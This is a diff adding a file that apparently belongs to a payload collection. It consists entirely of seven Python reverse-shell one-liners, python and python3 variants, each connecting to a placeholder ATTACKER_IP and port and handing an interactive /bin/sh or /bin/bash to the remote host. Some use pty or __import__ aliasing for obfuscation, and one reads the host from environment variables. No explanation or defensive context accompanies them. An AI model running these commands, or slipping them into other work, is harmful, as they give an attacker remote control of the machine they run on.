@@ -1,0 +1,7 @@
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+python -c 'a=__import__;s=a("socket").socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));[a("os").dup2(s.fileno(),fd) for fd in (0,1,2)];a("pty").spawn("/bin/bash")'
+python3 -c 'a=__import__;s=a("socket").socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));[a("os").dup2(s.fileno(),fd) for fd in (0,1,2)];a("pty").spawn("/bin/bash")'
+export RHOST="ATTACKER_IP";export RPORT=ATTACKER_PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
